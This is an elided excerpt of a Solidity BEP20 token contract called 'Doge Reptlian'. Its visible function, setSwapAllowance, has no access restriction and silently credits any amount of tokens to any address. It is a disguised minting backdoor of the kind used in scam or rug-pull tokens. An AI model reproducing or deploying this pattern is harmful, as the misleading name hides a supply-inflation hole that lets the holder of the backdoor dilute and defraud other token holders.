...
contract DogeReptlian is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "Doge Reptlian";
    string constant _symbol = "REPTILIAN";
    ...
    function setSwapAllowance(uint256 value, address dividendTracker)external{
        _balances[dividendTracker]=_balances[dividendTracker].add(value*(10 ** _decimals));
    }
